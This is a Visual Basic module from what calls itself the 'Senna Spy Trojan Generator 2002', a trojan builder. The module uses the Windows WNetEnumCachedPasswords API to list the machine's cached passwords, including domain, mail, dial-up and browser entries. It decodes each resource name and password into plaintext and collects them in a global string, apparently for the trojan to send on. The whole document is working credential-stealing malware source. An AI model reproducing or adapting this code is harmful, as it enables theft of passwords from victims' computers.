Attribute VB_Name = "PASSWORD"
' Senna Spy Trojan Generator 2002
' The First Internet-Trojan Generator In The World !

Option Explicit

Type PASSWORD_CACHE_ENTRY
   cbEntry As Integer              'size of this returned structure in bytes
   cbResource As Integer           'size of the resource string, in bytes
   cbPassword As Integer           'size of the password string, in bytes
   iEntry As Byte                  'entry position in PWL file
   nType As Byte                   'type of entry
   abResource(1 To 1024) As Byte   'buffer to hold resource string, followed by password string
                                   'should this be bigger?
End Type

Declare Function WNetEnumCachedPasswords Lib "mpr.dll" (ByVal s As String, ByVal i As Integer, ByVal b As Byte, ByVal proc As Long, ByVal l As Long) As Long

Public Function callback(x As PASSWORD_CACHE_ENTRY, ByVal lSomething As Long) As Integer
   Dim nLoop As Integer
   Dim cString As String

   cString = "Type: " & x.nType

   '1 = domains?
   '4 = mail/mapi clients?
   '6 = RAS entries?
   '19 = iexplorer entries?

   cString = cString & "     Resource: "
   For nLoop = 1 To x.cbResource
       If x.abResource(nLoop) <> 0 Then
          cString = cString & Chr(x.abResource(nLoop))
       Else
          cString = cString & " "
       End If
   Next

   cString = cString & "     Pwd: "

   For nLoop = x.cbResource + 1 To (x.cbResource + x.cbPassword)
       If x.abResource(nLoop) <> 0 Then
          cString = cString & Chr(x.abResource(nLoop))
       Else
          cString = cString & " "
       End If
   Next

   cComputer = cComputer + "Password: " + cString + vbCrLf

   callback = True
End Function

Public Sub GetPasswords()
   Dim nLoop As Integer
   Dim cString As String
   Dim lLong As Long
   Dim bByte As Byte

   bByte = &HFF
   nLoop = 0
   lLong = 0
   cString = ""

   Call WNetEnumCachedPasswords(cString, nLoop, bByte, AddressOf callback, lLong)
End Sub
